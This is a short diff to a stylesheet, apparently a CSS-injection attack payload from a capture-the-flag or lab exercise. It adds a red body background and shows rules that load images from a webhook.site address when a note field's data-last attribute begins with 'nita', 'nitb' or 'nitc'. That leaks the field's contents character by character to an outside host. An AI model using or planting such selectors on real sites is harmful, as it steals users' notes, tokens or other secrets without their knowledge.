@@ -1,3 +1,4 @@
+body{background-color:red;}
 #note-text-area[data-last^=nita]{background-image:url("https://webhook.site/746de57f-9e50-4385-ad0b-452c40a0085b/nita.png");}
 #note-text-area[data-last^=nitb]{background-image:url("https://webhook.site/746de57f-9e50-4385-ad0b-452c40a0085b/nitb.png");}
 #note-text-area[data-last^=nitc]{background-image:url("https://webhook.site/746de57f-9e50-4385-ad0b-452c40a0085b/nitc.png");}
